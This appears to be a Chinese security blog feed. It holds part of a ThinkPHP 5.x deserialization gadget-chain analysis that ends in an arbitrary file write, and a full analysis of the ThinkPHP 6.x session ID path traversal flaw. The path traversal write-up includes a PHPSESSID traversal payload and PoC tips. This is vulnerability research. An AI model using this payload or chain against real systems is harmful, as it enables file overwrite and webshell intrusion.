+<p>首先要满足穿来的<code>$modelRelation</code>是Relation类，全局查找getRelation方法且为Relation类的类，找到 <code>HasOne``(/thinkphp/library/think/model/relation/HasOne.php)</code></p>
+<pre><code class="language-php">public function getRelation($subRelation = '', $closure = null)
+{
+    // 执行关联定义方法
+    $localKey = $this-&gt;localKey;
+    if ($closure) {
+        call_user_func_array($closure, [ &amp; $this-&gt;query]);
+    }
+    // 判断关联类型执行查询
+    $relationModel = $this-&gt;query
+        -&gt;removeWhereField($this-&gt;foreignKey)
+        -&gt;where($this-&gt;foreignKey, $this-&gt;parent-&gt;$localKey)
+        -&gt;relation($subRelation)
+        -&gt;find();
+
+    if ($relationModel) {
+        $relationModel-&gt;setParent(clone $this-&gt;parent);
+    }
+
+    return $relationModel;
+}
+</code></pre>
+<p>可以看到满足条件，那么回到<code>Model.php</code>中继续跟进到第三处，执行到<code>Output.php</code>的__call函数，调用了block，跟进block</p>
+<pre><code class="language-php">protected function block($style, $message)
+{
+    $this-&gt;writeln(&quot;&lt;{$style}&gt;{$message}&lt;/$style&gt;&quot;);
+}
+</code></pre>
+<pre><code class="language-php">public function writeln($messages, $type = self::OUTPUT_NORMAL)
+{
+    $this-&gt;write($messages, true, $type);
+}
+</code></pre>
+<pre><code class="language-php">public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
+{
+    $this-&gt;handle-&gt;write($messages, $newline, $type);
+}
+</code></pre>
+<p>handle可控，看看有没有别的write，<code>/thinkphp/library/think/session/driver/Memcached.php</code>中有</p>
+<pre><code class="language-php">public function write($sessID, $sessData)
+{
+    return $this-&gt;handler-&gt;set($this-&gt;config['session_name'] . $sessID, $sessData, $this-&gt;config['expire']);
+}
+</code></pre>
+<p>跟到了set跳板，全局找到<code>/thinkphp/library/think/cache/driver/File.php</code>下的set</p>
+<pre><code class="language-php">public function set($name, $value, $expire = null) // 跟到set
+{
+    if (is_null($expire)) {
+        $expire = $this-&gt;options['expire'];
+    }
+    if ($expire instanceof \DateTime) {
+        $expire = $expire-&gt;getTimestamp() - time();
+    }
+    $filename = $this-&gt;getCacheKey($name, true); // name可控，继续跟进
+    if ($this-&gt;tag &amp;&amp; !is_file($filename)) {
+        $first = true;
+    }
+    $data = serialize($value);
+    if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) {
+        //数据压缩
+        $data = gzcompress($data, 3);
+    }
+    $data   = &quot;&lt; ?php\n//&quot; . sprintf('%012d', $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
+    $result = file_put_contents($filename, $data);
+    if ($result) {
+        isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
+        clearstatcache();
+        return true;
+    } else {
+        return false;
+    }
+}
+</code></pre>
+<p>这里写入函数file_put_contents的$filename由getCacheKey来，跟进看</p>
+<pre><code class="language-php">protected function getCacheKey($name, $auto = false)
+{
+    $name = md5($name);
+    if ($this-&gt;options['cache_subdir']) {
+        // 使用子目录
+        $name = substr($name, 0, 2) . DS . substr($name, 2);
+    }
+    if ($this-&gt;options['prefix']) {
+        $name = $this-&gt;options['prefix'] . DS . $name;
+    }
+    $filename = $this-&gt;options['path'] . $name . '.php';//用协议
+    $dir      = dirname($filename);
+
+    if ($auto &amp;&amp; !is_dir($dir)) {
+        mkdir($dir, 0755, true);
+    }
+    return $filename;
+}
+</code></pre>
+<p>options是可控的，继续回去看<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">与</mi></mrow><annotation encoding="application/x-tex">data与</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">与</span></span></span></span>value有关</p>
+<pre><code class="language-php">$data = serialize($value);
+...
+$data   = &quot;&lt;?php\n//&quot; . sprintf('%012d', $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
+</code></pre>
+<p>这里的$value进来是true，所以这里不可控，但是写完后会调用setTagItem，这里在<code>Driver.php</code>里</p>
+<pre><code class="language-php">protected function setTagItem($name)
+{
+    if ($this-&gt;tag) {
+        $key       = 'tag_' . md5($this-&gt;tag);
+        $this-&gt;tag = null;
+        if ($this-&gt;has($key)) {
+            $value   = explode(',', $this-&gt;get($key));
+            $value[] = $name;
+            $value   = implode(',', array_unique($value));
+        } else {
+            $value = $name;
+        }
+        $this-&gt;set($key, $value, 0); //再次调用set
+    }
+}
+</code></pre>
+<p>可以看到这里的值都是可控的，再调用了set，所以可以成功的写入文件</p>
+<h2 id="总结">总结</h2>
+<ol>
+<li>windows下写poc的tips1，（感谢osword小刀师傅），写入&lt;?exp.php，相当于exp.php，另外一个https://xz.aliyun.com/t/7310。自行更改后即可~</li>
+<li>要找一个有写入权限的目录</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Thinkphp 6.x(小于6.0.2)不安全的sessionid分析]]></title>
+        <id>https://chriskalix.github.io/post/thinkphp-6xxiao-yu-602bu-an-quan-de-sessionid-fen-xi/</id>
+        <link href="https://chriskalix.github.io/post/thinkphp-6xxiao-yu-602bu-an-quan-de-sessionid-fen-xi/">
+        </link>
+        <updated>2020-06-14T04:05:26.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
+<p>2020-01-10，thinkphp的github上更新了一处对sessionid检查的一处隐患<br>
+<img src="https://chriskalix.github.io/post-images/1592107642955.png" alt="" loading="lazy"><br>
+更新代码段如下<br>
+<img src="https://chriskalix.github.io/post-images/1592107658091.png" alt="" loading="lazy"><br>
+其中增加了对参数<code>$id</code>的校验，<code>ctype_alnum</code>函数判断参数是否为字母或数字的组合</p>
+<h2 id="分析">分析</h2>
+<p>在<code>src-&gt;think-&gt;session-&gt;Store.php</code>中</p>
+<pre><code class="language-php">public function setId($id = null): void
+{
+    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());
+}
+</code></pre>
+<p>找到Store.php中调用,找到save这个函数</p>
+<pre><code class="language-php">public function save(): void
+{
+    $this-&gt;clearFlashData();
+
+    $sessionId = $this-&gt;getId();
+
+    if (!empty($this-&gt;data)) {
+        $data = $this-&gt;serialize($this-&gt;data);
+
+        $this-&gt;handler-&gt;write($sessionId, $data);
+    } else {
+        $this-&gt;handler-&gt;delete($sessionId);
+    }
+    $this-&gt;init = false;
+}
+</code></pre>
+<p>具体传入<code>$this-&gt;handler-&gt;write()</code>，继续跟踪<code>handler</code>，发现在<code>__construct</code>中被初始化<br>
+全局搜索一下，看哪些接口<code>implement</code>了这个<code>SessionHandlerInterface</code><br>
+<img src="https://chriskalix.github.io/post-images/1592107766466.png" alt="" loading="lazy"><br>
+在<code>cache.php</code>和<code>file.php</code>中发现调用，由于<code>cache</code>中没有敏感操作的样子，直接看<code>file.php</code>,找到<code>write</code></p>
+<pre><code class="language-php">public function write(string $sessID, string $sessData): bool
+{
+    $filename = $this-&gt;getFileName($sessID, true);
+    $data     = $sessData;
+    if ($this-&gt;config['data_compress'] &amp;&amp; function_exists('gzcompress')) {
+        //数据压缩
+        $data = gzcompress($data, 3);
+    }
+    return $this-&gt;writeFile($filename, $data);
+}
+其中writeFile
+protected function writeFile($path, $content): bool
+{
+    return (bool) file_put_contents($path, $content, LOCK_EX);
+}
+</code></pre>
+<p>$sessID是可控的，那么看一下<code>getFileName</code>函数</p>
+<pre><code class="language-php">protected function getFileName(string $name, bool $auto = false): string
+{
+    if ($this-&gt;config['prefix']) {
+        // 使用子目录
+        $name = $this-&gt;config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name;
+    } else {
+        $name = 'sess_' . $name;
+    }
+    $filename = $this-&gt;config['path'] . $name;
+    $dir      = dirname($filename);
+    if ($auto &amp;&amp; !is_dir($dir)) {
+        try {
+            mkdir($dir, 0755, true);
+        } catch (\Exception $e) {
+            // 创建失败
+        }
+    }
+    return $filename;
+}
+</code></pre>
+<p>可以看到是直接拼接的，没有任何过滤方法，便直接调用file_put_contents了<br>
+现在从SetId往上，查找SetId的调用，通过全局搜索找到src-&gt;think-&gt;middleware的59行</p>
+<pre><code class="language-php">public function handle($request, Closure $next)
+{
+    // Session初始化
+    $varSessionId = $this-&gt;app-&gt;config-&gt;get('session.var_session_id');
+    $cookieName   = $this-&gt;session-&gt;getName();
+    if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {
+        $sessionId = $request-&gt;request($varSessionId);
+    } else {
+        $sessionId = $request-&gt;cookie($cookieName);
+    }
+    if ($sessionId) {
+        $this-&gt;session-&gt;setId($sessionId);
+    }
+    $this-&gt;session-&gt;init();
+    $request-&gt;withSession($this-&gt;session);
+    /** @var Response $response */
+    $response = $next($request);
+    $response-&gt;setSession($this-&gt;session);
+    $this-&gt;app-&gt;cookie-&gt;set($cookieName, $this-&gt;session-&gt;getId());
+    return $response;
+}
+</code></pre>
+<p>首先看初始化，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mi>a</mi><mi>r</mi><mi>S</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi>I</mi><mi>d</mi><mi mathvariant="normal">由</mi><mi mathvariant="normal">于</mi><mi>s</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>v</mi><mi>a</mi><msub><mi>r</mi><mi>s</mi></msub><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><msub><mi>n</mi><mi>i</mi></msub><mi>d</mi><mi mathvariant="normal">没</mi><mi mathvariant="normal">找</mi><mi mathvariant="normal">到</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">默</mi><mi mathvariant="normal">认</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">空</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">。</mi></mrow><annotation encoding="application/x-tex">varSessionId由于session.var_session_id没找到，默认为空值。</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">于</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">没</span><span class="mord cjk_fallback">找</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">默</span><span class="mord cjk_fallback">认</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">。</span></span></span></span>cookieName中调用了session-&gt;getname();session的类型为Session。跟进找到src-&gt;think-&gt;session-&gt;Store.php下有getName函数，默认值为PHPSESSID<br>
+到这里$sessionId就走向了else分支，因此可控变量就是Cookie中的PHPSESSID</p>
+<h2 id="漏洞的发生">漏洞的发生</h2>
+<p>根据同事博客中的文章快速起了一个环境。在app/controller/index.php中写一个函数，将传入的变量写入session中，那么就会存在被getshell的风险<br>
+因为目前session可控，但是默认session路径在/runtime/session下，且有一个sess_的前缀。然鹅尝试/../../是可以穿越路径的，那么危害就扩大为文件覆盖<br>
+如果开发时导致session中的某一参数可控，如下所示：</p>
+<pre><code class="language-php">public function mytest()
+{
+    $username = $_GET['name'];
+    Session::set('username',$username);
+    return 'success';
+}
+</code></pre>
+<p>那么就有可能存在被getshell的风险</p>
+<h2 id="总结与危害">总结与危害</h2>
+<ol>
+<li>危害范围在thinkphp 6.x且小于6.0.2</li>
+<li>默认的危害就是任意文件上传，可能造成文件覆盖</li>
+<li>在开发不当所导致的情况下(及session中内容用户可控)，那么可能导致getshell</li>
+</ol>
+<p>验证方法：<br>
+将PHPSESSID改为<code>/../../../public/././././123.php</code>，如果访问123.php成果则证明漏洞存在</p>
+<p>6.0.2中的修复：<br>
+直接加上ctype_alnum了，只能是数字或者字母，就不会出现这样的问题</p>
+<h2 id="参考文章">参考文章</h2>
+<p>https://blog.csdn.net/q851579181q/article/details/104344999<br>
+https://xz.aliyun.com/t/7109</p>
+]]></content>
+    </entry>
+</feed>
